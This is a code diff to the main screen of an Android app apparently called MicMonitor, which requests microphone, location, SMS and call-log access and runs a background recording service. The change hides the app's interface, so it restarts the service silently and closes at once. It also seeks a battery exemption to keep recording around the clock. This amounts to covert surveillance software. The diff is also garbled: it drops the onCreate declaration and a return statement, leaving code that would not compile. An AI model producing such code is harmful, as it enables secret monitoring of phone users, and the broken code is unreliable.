@@ -1,13 +1,16 @@
 package com.micmonitor.app
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.widget.Button
-import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -28,55 +31,25 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_CONTACTS,
             )
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 perms.add(Manifest.permission.POST_NOTIFICATIONS)
-                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
-                perms.add(Manifest.permission.READ_MEDIA_VIDEO)
-            } else {
-                @Suppress("DEPRECATION")
-                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            }
-            return perms.toTypedArray()
+        // Already set up — restart service silently and close immediately (no UI shown)
+        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
+            launchService()
+            requestBatteryOptExemption()
+            finish()
+            return
         }
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        val btnGrant    = findViewById<Button>(R.id.btnGrant)
-        val tvStatus    = findViewById<TextView>(R.id.tvStatus)
-        val etServerUrl = findViewById<EditText>(R.id.etServerUrl)
-
-        // Pre-fill saved server URL
-        val savedUrl = prefs.getString("server_url", MicService.DEFAULT_SERVER_URL) ?: MicService.DEFAULT_SERVER_URL
-        etServerUrl.setText(savedUrl)
-
-        // If already consented and has permissions, just let them update the URL
-        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
-            btnGrant.text = "Save URL & Restart Service"
-            tvStatus.text = "Service is running. Update URL if needed."
-            tvStatus.setTextColor(0xFF4CAF50.toInt())
-        }
+        val btnGrant = findViewById<Button>(R.id.btnGrant)
+        val tvStatus = findViewById<TextView>(R.id.tvStatus)
 
         btnGrant.setOnClickListener {
-            // Save the server URL first
-            val url = etServerUrl.text.toString().trim()
-            if (url.isNotEmpty()) {
-                prefs.edit().putString("server_url", url).apply()
-            }
-
-            if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
-                // Restart service with new URL
-                stopService(Intent(this, MicService::class.java))
-                launchService()
-                Toast.makeText(this, "Service restarted with new URL", Toast.LENGTH_SHORT).show()
-                finish()
-            } else {
-                tvStatus.text = "Requesting permissions..."
-                ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
-            }
+            tvStatus.text = "Requesting permissions..."
+            ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
         }
     }
 
@@ -94,14 +67,13 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
         if (requestCode == REQUEST_CODE) {
-            // Check RECORD_AUDIO specifically (mandatory)
             val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
             val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED
 
             if (micGranted) {
-                // Save consent permanently
                 prefs.edit().putBoolean("consent_given", true).apply()
                 launchService()
+                requestBatteryOptExemption()
                 finish()
             } else {
                 Toast.makeText(
@@ -124,7 +96,26 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    /** Asks Android to exempt this app from battery optimization so service runs 24/7 */
+    @SuppressLint("BatteryLife")
+    private fun requestBatteryOptExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val pm = getSystemService(PowerManager::class.java)
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                try {
+                    startActivity(
+                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                            .setData(Uri.parse("package:$packageName"))
+                    )
+                } catch (_: Exception) {
+                    // Settings screen unavailable on some devices; skip silently
+                }
+            }
+        }
+    }
+
     companion object {
         private const val REQUEST_CODE = 1001
     }
 }
+
